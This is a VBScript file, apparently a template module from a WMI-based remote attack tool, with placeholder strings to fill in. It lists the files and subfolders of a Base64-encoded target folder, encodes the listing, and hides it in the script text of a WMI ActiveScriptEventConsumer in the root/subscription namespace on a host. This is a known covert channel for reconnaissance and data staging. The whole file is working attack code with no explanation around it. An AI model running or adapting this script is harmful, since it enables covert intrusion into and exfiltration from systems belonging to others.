Function Base64Decode(ByVal vCode)
 Set oNode = CreateObject("Msxml2.DOMDocument.3.0").CreateElement("base64")
 oNode.dataType = "bin.base64"
 oNode.text = vCode
 Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
 Set oNode = Nothing
End Function

Function Stream_BinaryToString(Binary)
 Set BinaryStream = CreateObject("ADODB.Stream")
 BinaryStream.Type = 1
 BinaryStream.Open
 BinaryStream.Write Binary
 BinaryStream.Position = 0
 BinaryStream.Type = 2
 ' All Format =>  utf-16le - utf-8 - utf-16le
 BinaryStream.CharSet = "utf-8"
 Stream_BinaryToString = BinaryStream.ReadText
 Set BinaryStream = Nothing
End Function

Dim sFolder, sExt, message
sFolder = Base64Decode("AAAAAAAAAAAAAAAAAAAA")

Dim fs, oFolder, oFiles, oSubFolders
set fs = CreateObject("Scripting.FileSystemObject")
IF (fs.FolderExists(sFolder)) Then
    set oFolder = fs.GetFolder(sFolder)
    set oSubFolders = oFolder.SubFolders
    outdata = ""
    for each folder in oSubFolders
        message = "Folder:" & folder
        outdata = outdata & message & vbCrLf
    Next

    set oFiles = oFolder.Files
    for each file in oFiles
        sExt = fs.GetExtensionName(file)
        sExt = LCase(sExt)
        message = "FileName:" & file.Name & ", Extension :" & sExt
        outdata = outdata & message & vbCrLf
    Next
ELSE
    Base64Encode = "UmFpZEVuTWVpOllvdSBhcmUgcHJvbXB0ZWQgdGhhdCB0aGUgZmlsZSBkb2VzIG5vdCBleGlzdA=="
END IF

Function btoa(sourceStr)
    Dim i, j, n, carr, rarr(), a, b, c
    carr = Array("A", "B", "C", "D", "E", "F", "G", "H", _
            "I", "J", "K", "L", "M", "N", "O" ,"P", _
            "Q", "R", "S", "T", "U", "V", "W", "X", _
            "Y", "Z", "a", "b", "c", "d", "e", "f", _
            "g", "h", "i", "j", "k", "l", "m", "n", _
            "o", "p", "q", "r", "s", "t", "u", "v", _
            "w", "x", "y", "z", "0", "1", "2", "3", _
            "4", "5", "6", "7", "8", "9", "+", "/")
    n = Len(sourceStr)-1
    ReDim rarr(n\3)
    For i=0 To n Step 3
        a = AscW(Mid(sourceStr,i+1,1))
        If i < n Then
            b = AscW(Mid(sourceStr,i+2,1))
        Else
            b = 0
        End If
        If i < n-1 Then
            c = AscW(Mid(sourceStr,i+3,1))
        Else
            c = 0
        End If
        rarr(i\3) = carr(a\4) & carr((a And 3) * 16 + b\16) & carr((b And 15) * 4 + c\64) & carr(c And 63)
    Next
    i = UBound(rarr)
    If n Mod 3 = 0 Then
        rarr(i) = Left(rarr(i),2) & "=="
    ElseIf n Mod 3 = 1 Then
        rarr(i) = Left(rarr(i),3) & "="
    End If
    btoa = Join(rarr,"")
End Function


Function char_to_utf8(sChar)
    Dim c, b1, b2, b3
    c = AscW(sChar)
    If c < 0 Then
        c = c + &H10000
    End If
    If c < &H80 Then
        char_to_utf8 = sChar
    ElseIf c < &H800 Then
        b1 = c Mod 64
        b2 = (c - b1) / 64
        char_to_utf8 = ChrW(&HC0 + b2) & ChrW(&H80 + b1)
    ElseIf c < &H10000 Then
        b1 = c Mod 64
        b2 = ((c - b1) / 64) Mod 64
        b3 = (c - b1 - (64 * b2)) / 4096
        char_to_utf8 = ChrW(&HE0 + b3) & ChrW(&H80 + b2) & ChrW(&H80 + b1)
    Else
    End If
End Function

Function str_to_utf8(sSource)
    Dim i, n, rarr()
    n = Len(sSource)
    ReDim rarr(n - 1)
    For i=0 To n-1
        rarr(i) = char_to_utf8(Mid(sSource,i+1,1))
    Next
    str_to_utf8 = Join(rarr,"")
End Function

Function str_to_base64(sSource)
    str_to_base64 = btoa(str_to_utf8(sSource))
End Function

Base64Encode = str_to_base64(outdata)
Set objLocator = CreateObject("wbemscripting.swbemlocator")
Set SubobjSWbemServices = objLocator.ConnectServer(host, "root/subscription")
Set temp = SubobjSWbemServices.Get("ActiveScriptEventConsumer")
Set asec = temp.spawninstance_
asec.name="BBBBBBBBBBBBBBBBBBBBBBB"
Asec.scriptingengine="vbscript"
Asec.scripttext = Base64Encode
asecpath=asec.put_